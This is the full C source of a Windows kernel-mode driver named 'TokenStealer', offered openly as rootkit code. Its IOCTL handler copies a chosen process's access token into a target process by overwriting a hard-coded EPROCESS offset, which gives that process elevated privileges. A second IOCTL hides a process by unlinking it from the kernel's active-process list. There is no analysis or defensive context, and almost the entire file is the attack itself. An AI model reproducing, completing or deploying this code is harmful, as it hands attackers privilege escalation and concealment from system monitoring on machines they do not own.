#include <ntifs.h>
#include <wdf.h>

#pragma warning(disable: 28252 28253 4273)

#define IOCTL_STEAL_TOKEN   CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_HIDE_PROCESS  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef struct _PROCESS_IO_INPUT {
    ULONG SourcePid;
    ULONG TargetPid;
} PROCESS_IO_INPUT, * PPROCESS_IO_INPUT;

typedef struct _HIDE_PROC_INPUT {
    ULONG PidToHide;
} HIDE_PROC_INPUT, * PHIDE_PROC_INPUT;

DRIVER_INITIALIZE DriverEntry;
DRIVER_UNLOAD DriverUnload;
_Dispatch_type_(IRP_MJ_CREATE) DRIVER_DISPATCH DispatchCreate;
_Dispatch_type_(IRP_MJ_CLOSE) DRIVER_DISPATCH DispatchClose;
_Dispatch_type_(IRP_MJ_DEVICE_CONTROL) DRIVER_DISPATCH DispatchIoControl;

#define LOG(fmt, ...) DbgPrint("TokenStealer: " fmt "\n", __VA_ARGS__)

VOID HideProcess(PEPROCESS process)
{
    PLIST_ENTRY activeList = (PLIST_ENTRY)((PUCHAR)process + 0x448);
    PLIST_ENTRY blink = activeList->Blink;
    PLIST_ENTRY flink = activeList->Flink;

    if (blink && flink) {
        blink->Flink = flink;
        flink->Blink = blink;

        activeList->Flink = activeList;
        activeList->Blink = activeList;
    }
}

NTSTATUS
DriverEntry(
    _In_ PDRIVER_OBJECT DriverObject,
    _In_ PUNICODE_STRING RegistryPath
)
{
    UNREFERENCED_PARAMETER(RegistryPath);

    NTSTATUS status;
    UNICODE_STRING devName = RTL_CONSTANT_STRING(L"\\Device\\TokenStealer");
    UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\DosDevices\\TokenStealer");
    PDEVICE_OBJECT deviceObject = NULL;

    status = IoCreateDevice(DriverObject, 0, &devName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &deviceObject);
    if (!NT_SUCCESS(status)) {
        LOG("IoCreateDevice failed 0x%X", status);
        return status;
    }

    status = IoCreateSymbolicLink(&symLink, &devName);
    if (!NT_SUCCESS(status)) {
        LOG("IoCreateSymbolicLink failed 0x%X", status);
        IoDeleteDevice(deviceObject);
        return status;
    }

    DriverObject->MajorFunction[IRP_MJ_CREATE] =
        DriverObject->MajorFunction[IRP_MJ_CLOSE] = DispatchCreate;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchIoControl;
    DriverObject->DriverUnload = DriverUnload;

    LOG("Driver loaded");
    return STATUS_SUCCESS;
}

VOID DriverUnload(
    _In_ PDRIVER_OBJECT DriverObject
)
{
    UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\DosDevices\\TokenStealer");
    IoDeleteSymbolicLink(&symLink);
    IoDeleteDevice(DriverObject->DeviceObject);
    LOG("Driver unloaded");
}

NTSTATUS DispatchCreate(
    _In_ PDEVICE_OBJECT DeviceObject,
    _Inout_ PIRP Irp
)
{
    UNREFERENCED_PARAMETER(DeviceObject);
    Irp->IoStatus.Status = STATUS_SUCCESS;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

NTSTATUS DispatchClose(
    _In_ PDEVICE_OBJECT DeviceObject,
    _Inout_ PIRP Irp
)
{
    UNREFERENCED_PARAMETER(DeviceObject);
    Irp->IoStatus.Status = STATUS_SUCCESS;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

NTSTATUS DispatchIoControl(
    _In_ PDEVICE_OBJECT DeviceObject,
    _Inout_ PIRP Irp
)
{
    UNREFERENCED_PARAMETER(DeviceObject);
    PIO_STACK_LOCATION sp = IoGetCurrentIrpStackLocation(Irp);
    ULONG inLen = sp->Parameters.DeviceIoControl.InputBufferLength;
    PVOID buf = Irp->AssociatedIrp.SystemBuffer;
    NTSTATUS status = STATUS_INVALID_DEVICE_REQUEST;

    switch (sp->Parameters.DeviceIoControl.IoControlCode) {
    case IOCTL_STEAL_TOKEN:
        if (inLen < sizeof(PROCESS_IO_INPUT)) { status = STATUS_BUFFER_TOO_SMALL; break; }
        {
            PPROCESS_IO_INPUT input = buf;
            LOG("Steal: Source=%u, Target=%u", input->SourcePid, input->TargetPid);

            PEPROCESS src = NULL, tgt = NULL;
            status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)input->SourcePid, &src);
            if (!NT_SUCCESS(status)) break;
            status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)input->TargetPid, &tgt);
            if (!NT_SUCCESS(status)) { ObDereferenceObject(src); break; }

            PACCESS_TOKEN tok = PsReferencePrimaryToken(src);
            if (!tok) { ObDereferenceObject(src); ObDereferenceObject(tgt); status = STATUS_UNSUCCESSFUL; break; }

            ULONG_PTR masked = ((ULONG_PTR)tok) & ~0xFULL;

            KAPC_STATE apc;
            KeStackAttachProcess(tgt, &apc);
            *((ULONG_PTR*)((PUCHAR)tgt + 0x4b8)) = masked | 0x2;
            KeUnstackDetachProcess(&apc);

            ObDereferenceObject(src);
            ObDereferenceObject(tgt);
            ObDereferenceObject(tok);
            LOG("Steal done");
            status = STATUS_SUCCESS;
        }
        break;

    case IOCTL_HIDE_PROCESS:
        if (inLen < sizeof(HIDE_PROC_INPUT)) { status = STATUS_BUFFER_TOO_SMALL; break; }
        {
            PHIDE_PROC_INPUT input = buf;
            LOG("Hiding PID=%u", input->PidToHide);

            PEPROCESS proc = NULL;
            status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)input->PidToHide, &proc);
            if (!NT_SUCCESS(status)) break;

            HideProcess(proc);

            ObDereferenceObject(proc);
            LOG("Process hidden");
            status = STATUS_SUCCESS;
        }
        break;

    default:
        LOG("Unknown IOCTL 0x%X", sp->Parameters.DeviceIoControl.IoControlCode);
        status = STATUS_INVALID_DEVICE_REQUEST;
        break;
    }

    Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return status;
}
